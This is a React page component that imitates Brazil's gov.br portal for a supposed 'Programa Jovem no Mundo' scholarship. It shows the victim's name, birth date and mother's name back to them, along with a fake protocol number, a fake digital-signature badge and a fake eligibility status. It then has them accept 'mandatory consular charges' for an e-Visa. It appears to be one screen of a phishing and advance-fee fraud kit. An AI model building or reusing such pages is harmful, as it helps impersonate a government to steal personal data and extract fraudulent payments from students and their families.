import { useEffect, useMemo, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import GovHeader from '../components/gov/GovHeader.jsx'
import GovFooter from '../components/gov/GovFooter.jsx'

const GOV_LOGO = 'https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png'

function randomProtocol() {
  const part = () => Math.random().toString(36).substring(2, 6).toUpperCase()
  return `AUT-${part()}-${part()}-MEC`
}

export default function ValidarDados() {
  const navigate = useNavigate()
  const [terms, setTerms] = useState({ t1: false, t2: false })
  const [data, setData] = useState({ name: '', birth: '', mother: '' })

  const protocol = useMemo(() => randomProtocol(), [])

  useEffect(() => {
    document.body.classList.add('gov-body')
    return () => document.body.classList.remove('gov-body')
  }, [])

  useEffect(() => {
    const name = localStorage.getItem('user_name')
    const birth = localStorage.getItem('user_birth')
    const mother = localStorage.getItem('user_mother')
    if (!name) {
      navigate('/cadastro', { replace: true })
      return
    }
    setData({
      name: (name || '').toUpperCase(),
      birth: birth || '---',
      mother: (mother || '---').toUpperCase(),
    })
    localStorage.setItem('protocol_id', protocol)
  }, [navigate, protocol])

  function handleConfirm() {
    if (!terms.t1 || !terms.t2) {
      alert(
        'SISTEMA: É necessário aceitar todos os termos e confirmações para assinar o protocolo digital.'
      )
      return
    }
    navigate('/validacao-em-andamento')
  }

  return (
    <>
      <GovHeader />

      <div className="container-gov pb-10">
        <div className="breadcrumb flex items-center gap-2 py-6 text-sm text-blue-600">
          <svg className="w-5 h-5 text-blue-800" fill="currentColor" viewBox="0 0 24 24">
            <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" />
          </svg>
          <span>&gt;</span>
          <a href="#" className="hover:underline">Assuntos</a>
          <span>&gt;</span>
          <a href="#" className="hover:underline">Notícias</a>
          <span>&gt;</span>
          <span className="text-gray-500">Validação de Dados</span>
        </div>

        <div
          style={{
            background: '#f8fafc',
            borderRadius: 8,
            padding: 40,
            margin: '40px auto',
            border: '1px solid #e2e8f0',
            maxWidth: 800,
          }}
        >
          <h1 className="text-2xl font-black text-blue-900 mb-8 border-b pb-4">
            Conferência de Dados Cadastrais
          </h1>
          <p className="mb-8 text-gray-600">
            Verifique se as informações abaixo coincidem com os dados informados
            no Censo Escolar/Inep 2026 para garantir sua participação no
            Programa Jovem no Mundo.
          </p>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <Info label="Nome Civil Completo" value={data.name} />
            <Info label="Data de Nascimento" value={data.birth} />
            <Info label="Nome da Genitora (Mãe)" value={data.mother} />
            <Info
              label="Situação do Registro Inep/MEC"
              value="REGULAR / ELEGÍVEL"
              valueClass="text-green-600"
            />
          </div>

          <div className="bg-gray-100 p-4 rounded-lg flex items-center justify-between mb-8 border border-gray-200">
            <div className="flex items-center gap-3">
              <div className="text-blue-800">
                <svg className="w-8 h-8" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M17.81 4.47c-.08 0-.16.02-.23.06C15.66 5.42 14 7.82 14 10.5c0 3.14 2.15 5.75 5 6.38V20c0 .55.45 1 1 1s1-.45 1-1v-4.14c.59-.11 1.15-.31 1.66-.59.48-.26.65-.87.39-1.35-.26-.48-.87-.65-1.35-.39-.32.18-.68.31-1.05.38a4.496 4.496 0 0 1-3.65-4.41c0-2.11 1.25-4 3-4.88.5-.24.7-.84.46-1.34-.18-.38-.58-.61-.99-.61z" />
                </svg>
              </div>
              <div>
                <div className="text-[10px] text-gray-500 uppercase font-black">
                  Digital Fingerprint Protocol
                </div>
                <div className="text-xs font-mono text-blue-900">{protocol}</div>
              </div>
            </div>
            <div className="text-right">
              <div className="text-[10px] text-green-700 font-bold">
                ● ASSINADO DIGITALMENTE
              </div>
              <div className="text-[9px] text-gray-400 font-mono">
                ITI.BR - INFRAESTRUTURA DE CHAVES PÚBLICAS
              </div>
            </div>
          </div>

          <div className="space-y-4 mb-8">
            <label className="flex items-start gap-3 p-4 bg-white border border-gray-200 rounded-lg cursor-pointer hover:border-blue-300 transition-all">
              <input
                type="checkbox"
                checked={terms.t1}
                onChange={(e) => setTerms((p) => ({ ...p, t1: e.target.checked }))}
                className="mt-1 w-5 h-5 accent-blue-600 rounded"
              />
              <span className="text-[11px] text-gray-600 leading-tight">
                Confirmo que os dados apresentados acima estão corretos e
                correspondem ao meu registro oficial no Censo Escolar/Inep.
              </span>
            </label>
            <label className="flex items-start gap-3 p-4 bg-white border border-gray-200 rounded-lg cursor-pointer hover:border-blue-300 transition-all">
              <input
                type="checkbox"
                checked={terms.t2}
                onChange={(e) => setTerms((p) => ({ ...p, t2: e.target.checked }))}
                className="mt-1 w-5 h-5 accent-blue-600 rounded"
              />
              <span className="text-[11px] text-gray-600 leading-tight">
                Estou ciente de que a bolsa de estudos é integral (100% de
                subsídio acadêmico) e que os{' '}
                <strong>
                  encargos consulares internacionais obrigatórios
                </strong>{' '}
                para emissão do e-Visa são de responsabilidade do solicitante.
              </span>
            </label>
          </div>

          <button
            onClick={handleConfirm}
            className="bg-[#1351b4] text-white py-4 rounded-full font-bold w-full uppercase shadow-lg hover:bg-[#0c326f] transition-all"
          >
            Assinar Protocolo e Prosseguir
          </button>
          <button
            onClick={() => navigate(-1)}
            className="w-full mt-4 text-xs text-gray-400 font-bold hover:underline"
          >
            Dados não conferem / Corrigir CPF
          </button>
        </div>
      </div>

      <GovFooter logo={GOV_LOGO} />
    </>
  )
}

function Info({ label, value, valueClass = 'text-blue-900' }) {
  return (
    <div>
      <div className="text-xs font-bold uppercase text-slate-500 mb-1">
        {label}
      </div>
      <div className={`text-xl font-black mb-6 ${valueClass}`}>{value}</div>
    </div>
  )
}
